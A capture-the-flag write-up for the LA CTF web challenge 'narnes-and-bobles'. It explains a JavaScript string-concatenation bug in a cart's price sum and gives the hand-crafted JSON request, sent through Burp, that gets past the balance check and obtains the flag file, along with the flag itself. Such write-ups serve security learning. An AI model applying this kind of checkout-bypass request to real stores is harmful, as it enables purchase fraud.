# web - narnes-and-bobles

```
JavaScript Type Confusion / Type Coercion Logic Bug

books.json:
 {
    "id": "a3e33c2505a19d18",
    "title": "The Part-Time Parliament",
    "file": "part-time-parliament.pdf",
    **"price": "10"**
  }

1. Notice that the price is string for part-time-parliament.pdf

server.js:
const additionalSum = productsToAdd
  .filter((product) => !+product.is_sample)
  .map((product) => booksLookup.get(product.book_id).price ?? 99999999)
  **.reduce((l, r) => l + r, 0);**

2. Instead of sum it become string concatenation:
"10" + 1000000 → "101000000".
Then,
if (additionalSum + cartSum > balance) becomes if ("101000000" + null > 1000) which returns false and bypass the logic since "101000000" + null becomes 101000000null(NaN). 

main.js:
fetch('/cart/add', {
  method: 'POST',
  body: JSON.stringify({ products: [{ book_id, is_sample }] })
})

3. When clicking "Add to Cart" manually to add both parliament and flag, the frontend will send the POST request above which result in error popup (UI validation). To bypass this just craft the HTTP request manually (I used Burp in this case).

{
  "products": [
    { "book_id": "a3e33c2505a19d18", "is_sample": false },
    { "book_id": "2a16e349fb9045fa", "is_sample": false }
  ]
}

4. Modify the JSON and send the request. Refresh the tab and the flag will be added to the cart. Click checkout to download the file.

lactf{matcha_dubai_chocolate_labubu}
```

SOLVED by SazzRi

Solved by: yappare